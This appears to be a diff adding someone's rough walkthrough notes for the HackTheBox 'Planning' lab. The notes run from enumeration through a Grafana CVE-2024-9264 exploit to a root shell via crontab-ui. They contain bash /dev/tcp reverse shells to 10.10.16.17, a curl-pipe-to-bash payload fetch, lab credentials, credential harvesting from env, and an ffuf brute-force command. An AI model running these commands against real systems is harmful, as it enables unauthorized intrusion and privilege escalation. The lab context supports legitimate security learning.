@@ -1,0 +1,133 @@
+nmap -sV -sC -vv -oA nmap/planning ip address
+
+going to the page, 
+
+try to get to a page that isnt there to see what the error page is 
+
+http://planning.htb/efee,
+
+we see its running on nginx, so we cant really do anything 
+
+looking at the source code, 
+look for common application services, such as wordpress, drupal, larval, etc
+but there is nothing like that, 
+we see a .php, so we know its a php website,
+
+start a virtual host scan/ dns scan with gobuster 
+
+gobuster vhost -w /opt/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://planning.htb --append-domain planning.htb
+
+in the domain, there is a Courses anbd keyword input field
+
+start burpsuite
+intercept a request made on the courses and keyword field,
+
+try test' 
+try test" 
+try test or 1=1
+try %a%
+
+nothing changes,
+
+run a nuclei scan
+
+nuclei -target http://planning.htb
+
+gobuster finished and found grafana.planning.htb
+
+login with given creds 
+
+after logged in,
+
+look for version numbers and other tools or information
+
+
+look for change logs 
+
+go to CVEDetails for finding vulnerabilities
+
+look for a red max CVE, 
+
+google the CVE number github
+
+create a shell.sh file 
+
+add: bash -c 'bash -i >& /dev/tcp/10.10.16.17/9001 0>&1'
+
+we need to start a python3 server so the script will download and run our command to get reverse shell,
+
+python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "/usr/bin/curl http://10.10.16.17:8000/shell.sh | bash"   http://grafana.planning.htb
+
+if trying to put a reverse shell command as an argument, dont put it in directly,
+put the reverse shell into a file, 
+create a python3 server and run it like line 59
+
+once getting a reverse shell, do an env check by doing env 
+grab the username and password and do an ssh
+
+
+once logged into the user,
+
+do a sudo -l 
+
+do find . -type f
+
+do a ps -ef --forest
+
+do cat /etc/fstab
+
+do a ss -lntp
+
+cd /etc/
+
+grep -R 8000 2>/dev/null
+
+grep -R 3000 2>/dev/null
+
+curl -I http://127.0.0.1:3000
+
+cd /var/www
+
+cat index.php | less
+
+grep sh$ /etc/passwd
+
+mysql -u root -p
+
+cd /opt
+cd crontabs
+
+cat crontab.db
+
+cd /etc/systemd
+
+find . -type f -ls
+
+google search crontab-ui.service github
+
+look for default creds
+
+do a port forward
+
+go to a new line in terminal
+
+enter ~C
+
+ssh> -L  our listener:127.0.0.1:8000
+
+ssh> -L 8001:127.0.0.1:8000
+
+the username is root 
+the password is freom the crontab.db file 
+
+once logged in
+
+do a new cron tab,
+
+call it shell
+Command: bash -c 'bash -i >& /dev/tcp/10.10.16.17/9002 0>&1'
+
+
+wanting to do a user enumeration
+
+ffuf -request login.req -request-proto http -w <(sed 's/$/:P4ssw0rdS0pRi0T3c/' users.text)>  -mc all -enc FUZZ:b64encode -fc 401
